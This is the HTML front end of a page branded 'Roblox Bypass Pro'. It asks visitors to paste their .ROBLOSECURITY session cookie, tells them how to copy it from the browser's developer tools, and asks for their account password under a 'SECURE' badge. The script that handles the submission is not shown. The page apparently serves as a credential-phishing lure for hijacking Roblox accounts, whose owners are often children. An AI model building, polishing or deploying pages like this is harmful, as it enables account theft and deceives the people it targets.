<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Bypass Pro | Auto Handler</title>
    <link rel="stylesheet" href="public/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ðŸ¤–</text></svg>">
</head>
<body>


    <!-- Animated Background -->
    <div class="animated-bg">
        <div class="particles" id="particles"></div>
        <div class="floating-shapes">
            <div class="shape shape1"></div>
            <div class="shape shape2"></div>
            <div class="shape shape3"></div>
            <div class="shape shape4"></div>
            <div class="shape shape5"></div>
        </div>
    </div>

    <!-- Main Container -->
    <div class="container" id="mainContainer">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <i class="fas fa-robot"></i>
                <h1>Roblox<span class="highlight">Bypass</span>Pro</h1>
            </div>
            <div class="nav-controls">
                <button class="btn-nav" id="themeToggle">
                    <i class="fas fa-moon"></i>
                </button>
                <button class="btn-nav" id="soundToggle">
                    <i class="fas fa-volume-up"></i>
                </button>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="center-panel">
                <div class="card form-card">
                    <div class="card-header">
                        <i class="fas fa-key"></i>
                        <h2>Credentials Input</h2>
                        <div class="card-badge">SECURE</div>
                    </div>

                    <div class="form-group">
                        <label for="cookieInput">
                            <i class="fas fa-cookie-bite"></i>
                            Roblox Cookie
                        </label>
                        <div class="input-with-icon">
                            <textarea
                                id="cookieInput"
                                placeholder="Paste your .ROBLOSECURITY cookie here..."
                                rows="4"
                                spellcheck="false"
                            ></textarea>
                            <button class="btn-icon" id="pasteCookie">
                                <i class="fas fa-paste"></i>
                            </button>
                        </div>
                        <div class="input-info">
                            <i class="fas fa-info-circle"></i>
                            How to get cookie? F12 â†’ Application â†’ Cookies
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="passwordInput">
                            <i class="fas fa-lock"></i>
                            Account Password
                        </label>
                        <div class="input-with-icon">
                            <input
                                type="password"
                                id="passwordInput"
                                placeholder="Enter your Roblox password"
                                spellcheck="false"
                            >
                            <button class="btn-icon" id="togglePassword">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="password-strength">
                            <div class="strength-bar"></div>
                            <span class="strength-text">Password strength</span>
                        </div>
                    </div>

                    <div class="form-actions">
                        <button class="btn-primary btn-lg" id="submitBtn">
                            <i class="fas fa-play"></i>
                            SUBMIT
                        </button>
                        <button class="btn-secondary" id="clearBtn">
                            <i class="fas fa-broom"></i>
                            Clear All
                        </button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- Notification System -->
    <div class="notification-container" id="notificationContainer"></div>

    <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3"></audio>
    <audio id="errorSound" src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-buzzer-1551.mp3"></audio>

    <script src="script.js"></script>
</body>
</html>
